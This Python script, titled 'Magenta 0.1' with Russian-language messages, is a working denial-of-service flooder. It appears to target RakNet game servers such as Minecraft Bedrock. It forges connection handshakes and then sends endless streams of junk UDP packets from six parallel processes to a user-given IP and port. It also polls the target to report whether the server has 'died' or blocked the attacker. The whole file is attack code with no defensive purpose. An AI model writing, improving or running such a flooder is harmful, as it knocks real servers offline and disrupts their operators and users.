import socket, binascii, sys, os, signal
from struct import pack
from time import sleep, time
from multiprocessing import Process, current_process
from datetime import datetime
import os
from colorama import init
from colorama import Fore

init()

BANNER = '''
Magenta 0.1 - FIX by Devclancy
'''


def address(addr, port):
    return "\x04" + ''.join([chr(int(i)) for i in addr.split('.')]) + chr(int(port / 256)) + chr(port % 256)

def junk(addr, port, initsleep = 0):
    signal.signal(signal.SIGINT, lambda a, b: sys.exit(0))
    MAGIC = "\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
    PROTOCOL = 6
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*64)
    OPEN_CONNECTION_REQUEST_1 = chr(5) + MAGIC + chr(PROTOCOL) + "\x00"
    OPEN_CONNECTION_REQUEST_2 = chr(7) + MAGIC + address(addr, port) + "\x00" + chr(19) + "\x6d\x6e\x74\x61"
    TRUCK = bytes(b'\x00\xff\x00' + b'\x8c' + ((b'\x00') * (1464)))
    sleep(initsleep)
    sock.sendto(bytes(OPEN_CONNECTION_REQUEST_1, 'utf-8'), (addr, port))
    sock.sendto(bytes(OPEN_CONNECTION_REQUEST_2, 'utf-8'), (addr, port))
    seq = 1
    while True:
        sock.sendto(bytes(b'\x8c') + pack('<L', seq)[:3] + TRUCK, (addr, port))
        seq += 1
        sleep(0.005)

def killall(processes):
    exit()

def check(addr, port, processes):
    signal.signal(signal.SIGINT, lambda a, b: killall(processes))
    while True:
        sys.stdout.write(Fore.CYAN + "[%s] Проверяю сервер... " % datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S'))
        asock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        asock.settimeout(10)
        asock.sendto(bytes("\x01\xaa\xba\xba\xaa\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78", 'utf-8'), (addr, port)) # unconnected ping, to check server availibility.
        try:
            resp = binascii.hexlify(asock.recv(1024))
        except (socket.timeout, ConnectionError):
            sys.stdout.write(Fore.GREEN + "Сервер не отвечает. Может быть он умер?\n")
            killall(processes)
            continue

        if resp.decode('utf-8')[:4] == '1cc2':
            sys.stdout.write(Fore.RED + "Сервер живой.\n")
        else:
            sys.stdout.write(Fore.GREEN + "Сервер умер, либо заблокировал тебя.\n")
            killall(processes)

        sleep(15)

if __name__ == '__main__':
    os.system("cls")

    print(Fore.RED + BANNER)

    if len(sys.argv) < 3:
        print(Fore.CYAN + 'Используй: %s <айпи> <порт>' % (sys.argv[0]))
        sys.exit()

    addr = socket.gethostbyname(sys.argv[1])
    print(Fore.CYAN + "Айпи: %s (%s)" % (sys.argv[1], addr))
    sleep(0.5)
    processes = [Process(target=junk, args=(addr, int(sys.argv[2]), i * (0.01/16))) for i in range(6)]
    for p in processes:
        p.start()

    check(addr, int(sys.argv[2]), processes)
